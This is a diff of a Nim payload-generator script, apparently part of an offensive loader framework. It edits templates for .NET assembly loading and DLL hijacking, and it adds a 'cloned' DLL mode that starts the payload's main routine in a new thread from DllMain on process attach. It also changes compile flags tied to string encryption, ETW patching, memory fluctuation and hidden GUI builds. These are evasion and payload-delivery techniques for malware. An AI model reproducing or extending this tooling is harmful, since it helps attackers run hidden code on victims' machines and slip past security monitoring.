@@ -952,11 +952,13 @@ let LoadAssemblyStubArgs = """
 
 when not defined(proxy):
     when not defined(service):
-        discard main(nil)
+        when not defined(cloned):
+            discard main(nil)
 
 when defined(defaultMain):
     when not defined(service):
-        discard main(nil)
+        when not defined(cloned):
+            discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -967,11 +969,13 @@ let LoadAssemblyStubNoArgs = """
 
 when not defined(proxy):
     when not defined(service):
-        discard main(nil)
+        when not defined(cloned):
+            discard main(nil)
 
 when defined(defaultMain):
     when not defined(service):
-        discard main(nil)
+        when not defined(cloned):
+            discard main(nil)
 """
 
 
@@ -1371,7 +1375,8 @@ when defined(COMVARETW):
     from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
 
 when not defined(proxy):
-    import strenc
+    when defined(notcloned):
+        import strenc
 when defined(Fluctuate):
     import Fluctuation
 
@@ -1704,11 +1709,13 @@ when defined(notcloned):
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  when defined(notcloned):
-    NimMain()
+  NimMain()
   
   if fdwReason == DLL_PROCESS_ATTACH:
     NimMain()
+    when defined(cloned):
+        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        CloseHandle(threadHandle)
   if fdwReason == DLL_THREAD_ATTACH:
     NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
@@ -2387,8 +2394,12 @@ if (dllClone == false):
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
 
-if ((dllProxy == false) and (dllClone == false)):
+if ((dllProxy == false) #[and (dllClone == false)]#):
     basicCompileFlags.add("-d:defaultMain ")
+
+if(dllClone):
+    basicCompileFlags.add("--mm:none ")
+    basicCompileFlags.add("-d:cloned ")
 
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
@@ -2427,10 +2438,10 @@ if localCreateThread:
     basicCompileFlags.add("-d:LocalCreateThread ")
 
 if (dll_out or cpl):
-    if (processname == ""):
-        basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
-    else:
-        basicCompileFlags.add("--app=lib -d:lib_only ")
+    #if (processname == ""): # Why did I do that? It make no sense.
+    #    basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
+    #else:
+    basicCompileFlags.add("--app=lib -d:lib_only --nomain ")
 else:
     if(hide):
         basicCompileFlags.add("--app=gui ")
